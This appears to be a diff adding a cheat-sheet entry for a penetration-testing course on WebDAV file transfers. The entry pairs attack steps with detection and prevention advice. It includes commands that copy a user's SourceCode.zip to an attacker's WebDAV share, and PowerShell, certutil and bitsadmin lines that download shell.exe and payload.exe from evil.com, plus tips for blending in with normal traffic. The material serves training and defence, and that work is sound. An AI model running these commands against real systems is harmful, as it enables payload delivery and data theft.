@@ -1,0 +1,106 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "webdav"
+  ],
+  "tools": [
+    "wsgidav"
+  ],
+  "tags": [
+    "webdav",
+    "transfer"
+  ],
+  "category": "File Transfers",
+  "subcategory": "WebDAV / FTP Servers",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Start an anonymous WebDAV server",
+      "command": "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous"
+    }
+  ],
+  "notes": "WebDAV (wsgidav / Apache) gives a writable HTTP share Windows can map (`net use`) - handy when SMB is filtered but HTTP is allowed. Also an exec vector for some CVEs.",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "win-ps-download",
+      "rel": "alternative",
+      "note": "Plain HTTP cradle if WebDAV isn't needed."
+    },
+    {
+      "id": "library-ms-webdav-attack",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "webdav-transfer",
+  "name": "WebDAV - Transfer",
+  "command": "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous",
+  "description": "WebDAV over HTTP is often allowed out of restrictive networks where SMB is blocked. Host a WebDAV share and access it from Windows via the DavWWWRoot UNC path.",
+  "steps": [
+    {
+      "label": "1. Start WebDAV server (attacker)",
+      "command": "sudo pip3 install wsgidav cheroot\nsudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous"
+    },
+    {
+      "label": "2. Access from Windows",
+      "command": "dir \\\\192.168.49.128\\DavWWWRoot\ncopy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "variations": [
+    {
+      "command": "smbclient //<ip>/<share> -c 'put <local_file>'",
+      "caption": "Upload file via smbclient (when SMB is available)",
+      "label": "smbclient"
+    },
+    {
+      "command": "smbclient //<ip>/<share> -c 'get <remote_file>'",
+      "caption": "Download file via smbclient",
+      "label": "smbclient"
+    },
+    {
+      "command": "smbclient //<ip>/<share> -U <user>%<pass> -c 'put <file>'",
+      "caption": "Authenticated smbclient upload",
+      "label": "smbclient"
+    }
+  ],
+  "defense": {
+    "why_it_works": "WebDAV serves files over HTTP(S) with PUT/GET, so a Windows target can map \\\\attacker\\DavWWWRoot and copy files - transfer over web ports (80/443) that are usually allowed outbound.",
+    "prerequisites": "An attacker WebDAV server (e.g. wsgidav) and the target able to reach it over 80/443; WebClient service on Windows.",
+    "impact": "Files transferred over HTTP(S) via UNC paths, using commonly-allowed web ports to bypass port-based filtering.",
+    "detection": "WebDAV shows as HTTP PUT/GET to an external host and a mounted \\\\...\\DavWWWRoot; the WebClient service starting is itself a signal; new file on disk.",
+    "artifacts": "HTTP PUT/PROPFIND to the attacker; a mapped DavWWWRoot; WebClient service start; the transferred file.",
+    "prevention": "[MITRE T1105 M1037] Web filtering/domain whitelisting; disable the WebClient service where not needed; alert on WebDAV method use and external UNC mounts.",
+    "evasion": "WebDAV rides allowed web ports (80/443); use HTTPS and an allowed-looking domain to blend with normal web traffic.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
